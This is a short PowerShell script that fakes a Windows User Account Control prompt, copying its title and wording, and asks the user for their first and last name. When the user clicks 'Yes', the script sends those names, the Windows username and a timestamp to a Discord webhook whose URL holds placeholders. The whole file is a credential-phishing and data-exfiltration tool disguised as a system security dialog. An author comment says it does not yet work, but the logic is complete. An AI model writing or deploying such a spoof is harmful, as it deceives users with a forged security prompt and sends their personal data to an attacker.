#This just doesnt work rn

Add-Type -AssemblyName System.Windows.Forms

$form = New-Object System.Windows.Forms.Form
$form.Text = "User Account Control"
$form.Size = New-Object System.Drawing.Size(480,230)
$form.FormBorderStyle = 'FixedDialog'
$form.StartPosition = 'CenterScreen'
$form.TopMost = $true
$form.MaximizeBox = $false
$form.MinimizeBox = $false

# Label: UAC message
$label = New-Object System.Windows.Forms.Label
$label.Text = "Do you want to allow this app to make changes to your device?"
$label.Size = New-Object System.Drawing.Size(440,40)
$label.Location = New-Object System.Drawing.Point(20,20)
$label.Font = New-Object System.Drawing.Font("Segoe UI",12)
$form.Controls.Add($label)

# TextBox: First Name
$tb1 = New-Object System.Windows.Forms.TextBox
$tb1.PlaceholderText = "First Name"
$tb1.Location = New-Object System.Drawing.Point(20,80)
$tb1.Size = New-Object System.Drawing.Size(200,30)
$form.Controls.Add($tb1)

# TextBox: Last Name
$tb2 = New-Object System.Windows.Forms.TextBox
$tb2.PlaceholderText = "Last Name"
$tb2.Location = New-Object System.Drawing.Point(240,80)
$tb2.Size = New-Object System.Drawing.Size(200,30)
$form.Controls.Add($tb2)

# Button
$btn = New-Object System.Windows.Forms.Button
$btn.Text = "Yes"
$btn.Location = New-Object System.Drawing.Point(350,130)
$btn.Size = New-Object System.Drawing.Size(90,30)
$btn.Add_Click({
    $first = $tb1.Text
    $last = $tb2.Text
    if ($first -and $last) {
        # Send to webhook or save locally
        $webhook = "https://discord.com/api/webhooks/XXXX/XXXX"
        $msg = @{ content = "$env:USERNAME - $first $last - $(Get-Date)" } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType 'application/json'
        $form.Close()
    } else {
        [System.Windows.Forms.MessageBox]::Show("Please fill in both fields.")
    }
})
$form.Controls.Add($btn)

$form.ShowDialog()
